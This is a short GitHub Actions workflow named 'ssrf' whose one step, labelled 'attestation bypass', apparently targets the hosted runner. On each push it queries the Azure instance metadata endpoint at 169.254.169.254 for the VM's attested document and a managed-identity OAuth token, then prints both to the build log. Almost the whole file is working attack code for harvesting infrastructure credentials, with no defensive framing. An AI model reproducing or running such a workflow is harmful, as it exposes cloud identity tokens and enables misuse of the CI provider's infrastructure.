name: ssrf
on: [push]
permissions:
  id-token: write
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: attestation bypass
        run: |
          # IMDS se VM attestation token nikaalte hain
          echo "=== IMDS ATTESTED ==="
          curl -s -H "Metadata: true" \
            "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01" | head -50
          
          echo "=== IMDS IDENTITY ==="
          curl -s -H "Metadata: true" \
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=api://hosted-compute-ro" | head -20
